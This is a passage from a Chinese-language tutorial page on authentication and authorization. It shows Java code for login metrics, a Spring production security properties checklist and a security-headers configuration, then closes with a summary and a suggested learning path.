</span><span id="__span-148-19"><a id="__codelineno-148-19" name="__codelineno-148-19" href="#__codelineno-148-19"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">loginFailures</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Counter</span><span class="p">.</span><span class="na">builder</span><span class="p">(</span><span class="s">&quot;auth.login.failures&quot;</span><span class="p">)</span>
</span><span id="__span-148-20"><a id="__codelineno-148-20" name="__codelineno-148-20" href="#__codelineno-148-20"></a><span class="w">            </span><span class="p">.</span><span class="na">description</span><span class="p">(</span><span class="s">&quot;Failed logins&quot;</span><span class="p">)</span>
</span><span id="__span-148-21"><a id="__codelineno-148-21" name="__codelineno-148-21" href="#__codelineno-148-21"></a><span class="w">            </span><span class="p">.</span><span class="na">tag</span><span class="p">(</span><span class="s">&quot;reason&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;invalid_credentials&quot;</span><span class="p">)</span>
</span><span id="__span-148-22"><a id="__codelineno-148-22" name="__codelineno-148-22" href="#__codelineno-148-22"></a><span class="w">            </span><span class="p">.</span><span class="na">register</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span>
</span><span id="__span-148-23"><a id="__codelineno-148-23" name="__codelineno-148-23" href="#__codelineno-148-23"></a>
</span><span id="__span-148-24"><a id="__codelineno-148-24" name="__codelineno-148-24" href="#__codelineno-148-24"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">authenticationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Timer</span><span class="p">.</span><span class="na">builder</span><span class="p">(</span><span class="s">&quot;auth.time&quot;</span><span class="p">)</span>
</span><span id="__span-148-25"><a id="__codelineno-148-25" name="__codelineno-148-25" href="#__codelineno-148-25"></a><span class="w">            </span><span class="p">.</span><span class="na">description</span><span class="p">(</span><span class="s">&quot;Authentication processing time&quot;</span><span class="p">)</span>
</span><span id="__span-148-26"><a id="__codelineno-148-26" name="__codelineno-148-26" href="#__codelineno-148-26"></a><span class="w">            </span><span class="p">.</span><span class="na">register</span><span class="p">(</span><span class="n">registry</span><span class="p">);</span>
</span><span id="__span-148-27"><a id="__codelineno-148-27" name="__codelineno-148-27" href="#__codelineno-148-27"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-148-28"><a id="__codelineno-148-28" name="__codelineno-148-28" href="#__codelineno-148-28"></a>
</span><span id="__span-148-29"><a id="__codelineno-148-29" name="__codelineno-148-29" href="#__codelineno-148-29"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">recordLoginAttempt</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-148-30"><a id="__codelineno-148-30" name="__codelineno-148-30" href="#__codelineno-148-30"></a><span class="w">        </span><span class="n">loginAttempts</span><span class="p">.</span><span class="na">increment</span><span class="p">();</span>
</span><span id="__span-148-31"><a id="__codelineno-148-31" name="__codelineno-148-31" href="#__codelineno-148-31"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-148-32"><a id="__codelineno-148-32" name="__codelineno-148-32" href="#__codelineno-148-32"></a>
</span><span id="__span-148-33"><a id="__codelineno-148-33" name="__codelineno-148-33" href="#__codelineno-148-33"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">recordLoginSuccess</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-148-34"><a id="__codelineno-148-34" name="__codelineno-148-34" href="#__codelineno-148-34"></a><span class="w">        </span><span class="n">loginSuccesses</span><span class="p">.</span><span class="na">increment</span><span class="p">();</span>
</span><span id="__span-148-35"><a id="__codelineno-148-35" name="__codelineno-148-35" href="#__codelineno-148-35"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-148-36"><a id="__codelineno-148-36" name="__codelineno-148-36" href="#__codelineno-148-36"></a>
</span><span id="__span-148-37"><a id="__codelineno-148-37" name="__codelineno-148-37" href="#__codelineno-148-37"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">recordLoginFailure</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-148-38"><a id="__codelineno-148-38" name="__codelineno-148-38" href="#__codelineno-148-38"></a><span class="w">        </span><span class="n">loginFailures</span><span class="p">.</span><span class="na">increment</span><span class="p">();</span>
</span><span id="__span-148-39"><a id="__codelineno-148-39" name="__codelineno-148-39" href="#__codelineno-148-39"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-148-40"><a id="__codelineno-148-40" name="__codelineno-148-40" href="#__codelineno-148-40"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="5-安全配置清单">5. 安全配置清单<a class="headerlink" href="#5-安全配置清单" title="链接到此标题">&para;</a></h3>
<p><strong>生产环境安全配置：</strong>
<div class="language-properties highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a><span class="c1"># application.properties</span>
</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2" href="#__codelineno-149-2"></a>
</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3" href="#__codelineno-149-3"></a><span class="c1"># 禁用不必要的HTTP方法</span>
</span><span id="__span-149-4"><a id="__codelineno-149-4" name="__codelineno-149-4" href="#__codelineno-149-4"></a><span class="na">spring.mvc.dispatch-options-request</span><span class="o">=</span><span class="s">false</span>
</span><span id="__span-149-5"><a id="__codelineno-149-5" name="__codelineno-149-5" href="#__codelineno-149-5"></a>
</span><span id="__span-149-6"><a id="__codelineno-149-6" name="__codelineno-149-6" href="#__codelineno-149-6"></a><span class="c1"># 禁用详细错误信息</span>
</span><span id="__span-149-7"><a id="__codelineno-149-7" name="__codelineno-149-7" href="#__codelineno-149-7"></a><span class="na">server.error.include-message</span><span class="o">=</span><span class="s">never</span>
</span><span id="__span-149-8"><a id="__codelineno-149-8" name="__codelineno-149-8" href="#__codelineno-149-8"></a><span class="na">server.error.include-stacktrace</span><span class="o">=</span><span class="s">never</span>
</span><span id="__span-149-9"><a id="__codelineno-149-9" name="__codelineno-149-9" href="#__codelineno-149-9"></a><span class="na">server.error.include-exception</span><span class="o">=</span><span class="s">false</span>
</span><span id="__span-149-10"><a id="__codelineno-149-10" name="__codelineno-149-10" href="#__codelineno-149-10"></a>
</span><span id="__span-149-11"><a id="__codelineno-149-11" name="__codelineno-149-11" href="#__codelineno-149-11"></a><span class="c1"># Session配置</span>
</span><span id="__span-149-12"><a id="__codelineno-149-12" name="__codelineno-149-12" href="#__codelineno-149-12"></a><span class="na">server.servlet.session.timeout</span><span class="o">=</span><span class="s">30m</span>
</span><span id="__span-149-13"><a id="__codelineno-149-13" name="__codelineno-149-13" href="#__codelineno-149-13"></a><span class="na">server.servlet.session.cookie.http-only</span><span class="o">=</span><span class="s">true</span>
</span><span id="__span-149-14"><a id="__codelineno-149-14" name="__codelineno-149-14" href="#__codelineno-149-14"></a><span class="na">server.servlet.session.cookie.secure</span><span class="o">=</span><span class="s">true</span>
</span><span id="__span-149-15"><a id="__codelineno-149-15" name="__codelineno-149-15" href="#__codelineno-149-15"></a><span class="na">server.servlet.session.cookie.same-site</span><span class="o">=</span><span class="s">strict</span>
</span><span id="__span-149-16"><a id="__codelineno-149-16" name="__codelineno-149-16" href="#__codelineno-149-16"></a>
</span><span id="__span-149-17"><a id="__codelineno-149-17" name="__codelineno-149-17" href="#__codelineno-149-17"></a><span class="c1"># 安全头</span>
</span><span id="__span-149-18"><a id="__codelineno-149-18" name="__codelineno-149-18" href="#__codelineno-149-18"></a><span class="na">server.servlet.session.tracking-modes</span><span class="o">=</span><span class="s">cookie</span>
</span><span id="__span-149-19"><a id="__codelineno-149-19" name="__codelineno-149-19" href="#__codelineno-149-19"></a>
</span><span id="__span-149-20"><a id="__codelineno-149-20" name="__codelineno-149-20" href="#__codelineno-149-20"></a><span class="c1"># 禁用不安全的默认值</span>
</span><span id="__span-149-21"><a id="__codelineno-149-21" name="__codelineno-149-21" href="#__codelineno-149-21"></a><span class="na">spring.security.filter.dispatcher-types</span><span class="o">=</span><span class="s">request,error,async,forward</span>
</span></code></pre></div></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a><span class="cm">/**</span>
</span><span id="__span-150-2"><a id="__codelineno-150-2" name="__codelineno-150-2" href="#__codelineno-150-2"></a><span class="cm"> * 安全头配置</span>
</span><span id="__span-150-3"><a id="__codelineno-150-3" name="__codelineno-150-3" href="#__codelineno-150-3"></a><span class="cm"> */</span>
</span><span id="__span-150-4"><a id="__codelineno-150-4" name="__codelineno-150-4" href="#__codelineno-150-4"></a><span class="nd">@Configuration</span>
</span><span id="__span-150-5"><a id="__codelineno-150-5" name="__codelineno-150-5" href="#__codelineno-150-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SecurityHeadersConfig</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-150-6"><a id="__codelineno-150-6" name="__codelineno-150-6" href="#__codelineno-150-6"></a>
</span><span id="__span-150-7"><a id="__codelineno-150-7" name="__codelineno-150-7" href="#__codelineno-150-7"></a><span class="w">    </span><span class="nd">@Bean</span>
</span><span id="__span-150-8"><a id="__codelineno-150-8" name="__codelineno-150-8" href="#__codelineno-150-8"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">SecurityFilterChain</span><span class="w"> </span><span class="nf">filterChain</span><span class="p">(</span><span class="n">HttpSecurity</span><span class="w"> </span><span class="n">http</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-150-9"><a id="__codelineno-150-9" name="__codelineno-150-9" href="#__codelineno-150-9"></a><span class="w">        </span><span class="n">http</span><span class="p">.</span><span class="na">headers</span><span class="p">()</span>
</span><span id="__span-150-10"><a id="__codelineno-150-10" name="__codelineno-150-10" href="#__codelineno-150-10"></a><span class="w">            </span><span class="c1">// 防止点击劫持</span>
</span><span id="__span-150-11"><a id="__codelineno-150-11" name="__codelineno-150-11" href="#__codelineno-150-11"></a><span class="w">            </span><span class="p">.</span><span class="na">frameOptions</span><span class="p">().</span><span class="na">deny</span><span class="p">()</span>
</span><span id="__span-150-12"><a id="__codelineno-150-12" name="__codelineno-150-12" href="#__codelineno-150-12"></a><span class="w">            </span><span class="c1">// XSS保护</span>
</span><span id="__span-150-13"><a id="__codelineno-150-13" name="__codelineno-150-13" href="#__codelineno-150-13"></a><span class="w">            </span><span class="p">.</span><span class="na">xssProtection</span><span class="p">().</span><span class="na">enable</span><span class="p">()</span>
</span><span id="__span-150-14"><a id="__codelineno-150-14" name="__codelineno-150-14" href="#__codelineno-150-14"></a><span class="w">            </span><span class="c1">// 内容类型嗅探保护</span>
</span><span id="__span-150-15"><a id="__codelineno-150-15" name="__codelineno-150-15" href="#__codelineno-150-15"></a><span class="w">            </span><span class="p">.</span><span class="na">contentTypeOptions</span><span class="p">().</span><span class="na">enable</span><span class="p">()</span>
</span><span id="__span-150-16"><a id="__codelineno-150-16" name="__codelineno-150-16" href="#__codelineno-150-16"></a><span class="w">            </span><span class="c1">// HSTS</span>
</span><span id="__span-150-17"><a id="__codelineno-150-17" name="__codelineno-150-17" href="#__codelineno-150-17"></a><span class="w">            </span><span class="p">.</span><span class="na">httpStrictTransportSecurity</span><span class="p">()</span>
</span><span id="__span-150-18"><a id="__codelineno-150-18" name="__codelineno-150-18" href="#__codelineno-150-18"></a><span class="w">                </span><span class="p">.</span><span class="na">includeSubDomains</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
</span><span id="__span-150-19"><a id="__codelineno-150-19" name="__codelineno-150-19" href="#__codelineno-150-19"></a><span class="w">                </span><span class="p">.</span><span class="na">maxAgeInSeconds</span><span class="p">(</span><span class="mi">31536000</span><span class="p">)</span>
</span><span id="__span-150-20"><a id="__codelineno-150-20" name="__codelineno-150-20" href="#__codelineno-150-20"></a><span class="w">            </span><span class="c1">// CSP</span>
</span><span id="__span-150-21"><a id="__codelineno-150-21" name="__codelineno-150-21" href="#__codelineno-150-21"></a><span class="w">            </span><span class="p">.</span><span class="na">and</span><span class="p">()</span>
</span><span id="__span-150-22"><a id="__codelineno-150-22" name="__codelineno-150-22" href="#__codelineno-150-22"></a><span class="w">            </span><span class="p">.</span><span class="na">contentSecurityPolicy</span><span class="p">(</span>
</span><span id="__span-150-23"><a id="__codelineno-150-23" name="__codelineno-150-23" href="#__codelineno-150-23"></a><span class="w">                </span><span class="s">&quot;default-src &#39;self&#39;; &quot;</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-150-24"><a id="__codelineno-150-24" name="__codelineno-150-24" href="#__codelineno-150-24"></a><span class="w">                </span><span class="s">&quot;script-src &#39;self&#39; &#39;unsafe-inline&#39;; &quot;</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-150-25"><a id="__codelineno-150-25" name="__codelineno-150-25" href="#__codelineno-150-25"></a><span class="w">                </span><span class="s">&quot;style-src &#39;self&#39; &#39;unsafe-inline&#39;; &quot;</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-150-26"><a id="__codelineno-150-26" name="__codelineno-150-26" href="#__codelineno-150-26"></a><span class="w">                </span><span class="s">&quot;img-src &#39;self&#39; data: https:; &quot;</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-150-27"><a id="__codelineno-150-27" name="__codelineno-150-27" href="#__codelineno-150-27"></a><span class="w">                </span><span class="s">&quot;font-src &#39;self&#39; data:; &quot;</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-150-28"><a id="__codelineno-150-28" name="__codelineno-150-28" href="#__codelineno-150-28"></a><span class="w">                </span><span class="s">&quot;connect-src &#39;self&#39;&quot;</span>
</span><span id="__span-150-29"><a id="__codelineno-150-29" name="__codelineno-150-29" href="#__codelineno-150-29"></a><span class="w">            </span><span class="p">)</span>
</span><span id="__span-150-30"><a id="__codelineno-150-30" name="__codelineno-150-30" href="#__codelineno-150-30"></a><span class="w">            </span><span class="c1">// Referrer Policy</span>
</span><span id="__span-150-31"><a id="__codelineno-150-31" name="__codelineno-150-31" href="#__codelineno-150-31"></a><span class="w">            </span><span class="p">.</span><span class="na">and</span><span class="p">()</span>
</span><span id="__span-150-32"><a id="__codelineno-150-32" name="__codelineno-150-32" href="#__codelineno-150-32"></a><span class="w">            </span><span class="p">.</span><span class="na">referrerPolicy</span><span class="p">(</span><span class="n">ReferrerPolicy</span><span class="p">.</span><span class="na">STRICT_ORIGIN_WHEN_CROSS_ORIGIN</span><span class="p">);</span>
</span><span id="__span-150-33"><a id="__codelineno-150-33" name="__codelineno-150-33" href="#__codelineno-150-33"></a>
</span><span id="__span-150-34"><a id="__codelineno-150-34" name="__codelineno-150-34" href="#__codelineno-150-34"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
</span><span id="__span-150-35"><a id="__codelineno-150-35" name="__codelineno-150-35" href="#__codelineno-150-35"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-150-36"><a id="__codelineno-150-36" name="__codelineno-150-36" href="#__codelineno-150-36"></a><span class="p">}</span>
</span></code></pre></div>
<hr />
<h2 id="总结_1">总结<a class="headerlink" href="#总结_1" title="链接到此标题">&para;</a></h2>
<p>认证授权是应用安全的核心基石，需要理解以下关键点：</p>
<ol>
<li><strong>认证（Authentication）</strong> 确认"你是谁"，<strong>授权（Authorization）</strong> 确定"你能做什么"</li>
<li><strong>会话管理</strong> 有Session和Token两种方式，各有优劣，需根据场景选择</li>
<li><strong>密码学</strong> 是安全的基础，理解哈希、加密、签名的区别和应用场景</li>
<li><strong>安全威胁</strong> 无处不在，需要针对性防护（XSS、CSRF、SQL注入等）</li>
<li><strong>最佳实践</strong> 包括强密码策略、安全的Token管理、完善的日志监控</li>
</ol>
<p><strong>学习路径建议：</strong>
1. 掌握基础概念和原理（本文档）
2. 学习主流协议和标准（OAuth2、JWT、SSO）
3. 实践框架应用（Spring Security）
4. 深入架构设计（微服务安全、分布式会话）</p>
<p>继续学习下一章：<a href="../02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/">认证协议与标准</a></p>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="最后更新">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="2025年10月28日 01:11:29 CST">2025年10月28日 01:11:29</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="创建日期">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="2025年10月26日 21:32:24 CST">2025年10月26日 21:32:24</span>
  </span>

    
    
    
      
  <span class="md-source-file__fact">
    
      
  <span class="md-icon" title="贡献者">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/></svg>
  </span>
  <span>GitHub</span>

    
    <nav>
      
        <a href="https://github.com/zhangzimingmmz" class="md-author" title="@zhangzimingmmz">
          
          <img src="https://avatars.githubusercontent.com/u/125178543?v=4&size=72" alt="zhangzimingmmz">
        </a>
      
      
      
    </nav>
  </span>

    
  </aside>


  



  <form class="md-feedback" name="feedback" hidden>
    <fieldset>
      <legend class="md-feedback__title">
        这篇文章对你有帮助吗？
      </legend>
      <div class="md-feedback__inner">
        <div class="md-feedback__list">
          
            <button class="md-feedback__icon md-icon" type="submit" title="很有帮助" data-md-value="1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m7 0c0 .8-.7 1.5-1.5 1.5S14 10.3 14 9.5 14.7 8 15.5 8s1.5.7 1.5 1.5m-5 7.73c-1.75 0-3.29-.73-4.19-1.81L9.23 14c.45.72 1.52 1.23 2.77 1.23s2.32-.51 2.77-1.23l1.42 1.42c-.9 1.08-2.44 1.81-4.19 1.81"/></svg>
            </button>
          
            <button class="md-feedback__icon md-icon" type="submit" title="需要改进" data-md-value="0">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10m-6.5-4c.8 0 1.5.7 1.5 1.5s-.7 1.5-1.5 1.5-1.5-.7-1.5-1.5.7-1.5 1.5-1.5M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m2 4.5c1.75 0 3.29.72 4.19 1.81l-1.42 1.42C14.32 16.5 13.25 16 12 16s-2.32.5-2.77 1.23l-1.42-1.42C8.71 14.72 10.25 14 12 14"/></svg>
            </button>
          
        </div>
        <div class="md-feedback__note">
          
            <div data-md-value="1" hidden>
              
              
                
              
              
              
                
                
              
              感谢你的反馈！🎉 如果有任何建议，欢迎<a href="https://github.com/zhangzimingmmz/OpenTheDoor/issues" target="_blank">提交 Issue</a>
            </div>
          
            <div data-md-value="0" hidden>
              
              
                
              
              
              
                
                
              
              感谢你的反馈！我们会持续改进。📝 欢迎<a href="https://github.com/zhangzimingmmz/OpenTheDoor/issues" target="_blank">告诉我们</a>如何改进
            </div>
          
        </div>
      </div>
    </fieldset>
  </form>


                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="页脚" >
        
          
          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="上一页: 概述">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                上一页
              </span>
              <div class="md-ellipsis">
                概述
              </div>
            </div>
          </a>
        
        
          
          <a href="../02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/" class="md-footer__link md-footer__link--next" aria-label="下一页: 认证协议与标准">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                下一页
              </span>
              <div class="md-ellipsis">
                认证协议与标准
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
    <a href="https://github.com/zhangzimingmmz" target="_blank" rel="noopener" title="GitHub 个人主页" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="mailto:your-email@example.com" target="_blank" rel="noopener" title="邮件联系" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M536.4-26.3c9.8-3.5 20.6-1 28 6.3s9.8 18.2 6.3 28l-178 496.9c-5 13.9-18.1 23.1-32.8 23.1-14.2 0-27-8.6-32.3-21.7l-64.2-158c-4.5-11-2.5-23.6 5.2-32.6l94.5-112.4c5.1-6.1 4.7-15-.9-20.6s-14.6-6-20.6-.9l-112.4 94.3c-9.1 7.6-21.6 9.6-32.6 5.2L38.1 216.8c-13.1-5.3-21.7-18.1-21.7-32.3 0-14.7 9.2-27.8 23.1-32.8z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "navigation.tracking", "navigation.footer", "navigation.path", "navigation.prune", "toc.follow", "toc.integrate", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.code.select", "content.tabs.link", "content.tooltips", "content.footnote.tooltips", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.7a47a382.min.js", "tags": {"DevOps": "devops", "Java": "java", "Spring": "spring", "\u4e91\u539f\u751f": "cloud-native", "\u8ba4\u8bc1\u6388\u6743": "auth", "\u96c6\u5408\u6846\u67b6": "collections"}, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": 